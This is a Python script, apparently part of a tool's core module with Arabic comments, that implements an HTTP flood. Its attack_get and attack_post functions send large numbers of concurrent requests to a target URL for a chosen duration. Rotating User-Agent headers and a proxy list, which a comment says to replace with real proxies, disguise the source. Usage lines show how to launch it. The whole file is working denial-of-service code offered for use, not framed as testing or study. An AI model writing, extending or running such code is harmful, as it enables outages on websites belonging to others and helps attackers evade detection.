# core/runner.py
import asyncio
import aiohttp
import random
import time
import sys

# قائمة User-Agent عشوائية
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...",
    "Mozilla/5.0 (X11; Linux x86_64)...",
    # أضف المزيد حسب الحاجة
]

# قائمة بروكسيات (مثال)
PROXIES = [
    "http://127.0.0.1:8080",
    "socks5://127.0.0.1:9050",
    # استبدل بعناوين بروكسي حقيقية
]

def get_random_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive"
    }

async def attack_get(session, url):
    headers = get_random_headers()
    proxy = random.choice(PROXIES) if PROXIES else None
    try:
        async with session.get(url, headers=headers, proxy=proxy) as response:
            await response.text()
            print(f"GET {url} - {response.status}")
    except Exception as e:
        print(f"GET request failed: {e}")

async def attack_post(session, url, data):
    headers = get_random_headers()
    proxy = random.choice(PROXIES) if PROXIES else None
    try:
        async with session.post(url, data=data, headers=headers, proxy=proxy) as response:
            await response.text()
            print(f"POST {url} - {response.status}")
    except Exception as e:
        print(f"POST request failed: {e}")

async def run_attack(url, duration, concurrency, method="GET", data=None):
    timeout = aiohttp.ClientTimeout(total=10)
    end_time = time.time() + duration
    async with aiohttp.ClientSession(timeout=timeout) as session:
        tasks = []
        while time.time() < end_time:
            if method.upper() == "POST":
                tasks.append(asyncio.create_task(attack_post(session, url, data)))
            else:
                tasks.append(asyncio.create_task(attack_get(session, url)))
            if len(tasks) >= concurrency:
                await asyncio.gather(*tasks)
                tasks = []
        if tasks:
            await asyncio.gather(*tasks)

def main():
    if len(sys.argv) < 5:
        print("Usage: python3 runner.py <url> <duration_seconds> <concurrency> <method> [post_data]")
        print("Example GET: python3 runner.py https://example.com 60 100 GET")
        print("Example POST: python3 runner.py https://example.com 60 100 POST 'param1=value1&param2=value2'")
        sys.exit(1)

    url = sys.argv[1]
    duration = int(sys.argv[2])
    concurrency = int(sys.argv[3])
    method = sys.argv[4].upper()
    data = sys.argv[5] if len(sys.argv) > 5 else None

    asyncio.run(run_attack(url, duration, concurrency, method, data))

if __name__ == "__main__":
    main()
